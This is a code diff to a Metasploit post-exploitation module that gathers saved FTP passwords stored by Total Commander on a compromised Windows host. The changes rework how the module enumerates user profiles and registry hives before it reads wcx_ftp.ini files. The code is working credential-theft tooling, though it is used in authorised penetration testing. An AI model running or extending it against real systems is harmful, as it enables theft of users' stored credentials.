@@ -10,19 +10,21 @@
 require 'msf/core'
 require 'rex'
 require 'rex/parser/ini'
-
+require 'msf/core/post/windows/user_profiles'
 
 class Metasploit3 < Msf::Post
 	include Msf::Post::Windows::Registry
 	include Msf::Auxiliary::Report
+	include Msf::Post::Windows::UserProfiles
+
 
 	def initialize(info={})
 		super( update_info( info,
 				'Name'          => 'Windows Gather Total Commander Saved Password Extraction',
-				'Description'   => %q{ This module extracts weakly encrypted
-							saved FTP Passwords from Total Commander.
-							It finds saved FTP connections in the 
-							wcx_ftp.ini file.  },
+				'Description'   => %q{ 
+					This module extracts weakly encrypted saved FTP Passwords from Total Commander.
+					It finds saved FTP connections in the wcx_ftp.ini file.
+				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'TheLightCosine <thelightcosine[at]gmail.com>'],
 				'Version'       => '$Revision$',
@@ -35,30 +37,23 @@ class Metasploit3 < Msf::Post
 	def run
 		print_status("Checking Default Locations...")
 		check_systemroot
-		os = session.sys.config.sysinfo['OS']
-		drive = session.fs.file.expand_path("%SystemDrive%")
-		if os =~ /Windows 7|Vista|2008/
-			@appdata = '\\AppData\\Roaming\\'
-			@users = drive + '\\Users'
-		else
-			@appdata = '\\Application Data\\'
-			@users = drive + '\\Documents and Settings'
+		
+		grab_user_profiles().each do |user|
+			next if user['AppData'] == nil
+			next if user['ProfileDir'] == nil
+			check_userdir(user['ProfileDir'])
+			check_appdata(user['AppData'])
 		end
 		
-		get_users
-		@userpaths.each do |path|
-			check_userdir(path)
-			check_appdata(path)
-		end
-	
-		hklmpath = registry_getvaldata("HKLM\\Software\\Ghisler\\Total Commander", 'FtpIniName')
+		commander_key = "HKLM\\Software\\Ghisler\\Total Commander"
+		hklmpath = registry_getvaldata(commander_key, 'FtpIniName')
 		case hklmpath
 		when nil
 			print_status("Total Commander Does not Appear to be Installed Globally")
 		when "wcx_ftp.ini"
 			print_status("Already Checked SYSTEMROOT")
 		when ".\\wcx_ftp.ini"
-			hklminstpath = registry_getvaldata("HKLM\\Software\\Ghisler\\Total Commander", 'InstallDir')
+			hklminstpath = registry_getvaldata(commander_key, 'InstallDir')
 			check_other(hklminstpath +'\\wcx_ftp.ini')
 		when /APPDATA/
 			print_status("Already Checked AppData")
@@ -68,19 +63,20 @@ class Metasploit3 < Msf::Post
 			check_other(hklmpath)
 		end
 
-		registry_enumkeys('HKU').each do |k|
-			next unless k.include? "S-1-5-21"
-			next if k.include? "_Classes"
-			print_status("Looking at Key #{k}")
-			hkupath = registry_getvaldata("HKU\\#{k}\\Software\\Ghisler\\Total Commander", 'FtpIniName')
+		userhives=load_missing_hives()
+		userhives.each do |hive|
+			next if hive['HKU'] == nil 
+			print_status("Looking at Key #{hive['HKU']}")
+			profile_commander_key = "#{hive['HKU']}\\Software\\Ghisler\\Total Commander"
+			hkupath = registry_getvaldata(profile_commander_key, 'FtpIniName')
 			print_status("HKUP: #{hkupath}")
 			case hkupath
 			when nil
-				print_status("Total Commander Does not Appear to be Installed on This User or we do not have sufficient rights to this user")
+				print_status("Total Commander Does not Appear to be Installed on This User")
 			when "wcx_ftp.ini"
 				print_status("Already Checked SYSTEMROOT")
 			when ".\\wcx_ftp.ini"
-				hklminstpath = registry_getvaldata("HKU\\#{k}\\Software\\Ghisler\\Total Commander", 'InstallDir')
+				hklminstpath = registry_getvaldata(profile_commander_key, 'InstallDir')
 				check_other(hklminstpath +'\\wcx_ftp.ini')
 			when /APPDATA/
 				print_status("Already Checked AppData")
@@ -91,6 +87,7 @@ class Metasploit3 < Msf::Post
 				check_other(hkupath)
 			end
 		end
+		unload_our_hives(userhives)
 
 	end
 
@@ -109,7 +106,7 @@ class Metasploit3 < Msf::Post
 	end
 
 	def check_appdata(path)
-		filename= "#{path}#{@appdata}\\GHISLER\\wcx_ftp.ini"
+		filename= "#{path}\\GHISLER\\wcx_ftp.ini"
 		begin
 			iniexists = client.fs.file.stat(filename)
 			print_status("Found File at #{filename}")
@@ -146,17 +143,6 @@ class Metasploit3 < Msf::Post
 	end
 
 	
-	def get_users
-		@userpaths=[]
-		session.fs.dir.foreach(@users) do |path|
-			next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
-			@userpaths << "#{@users}\\#{path}\\"
-		end
-
-		
-
-	end
-
 
 	def get_ini(filename)
 		config = client.fs.file.new(filename,'r')
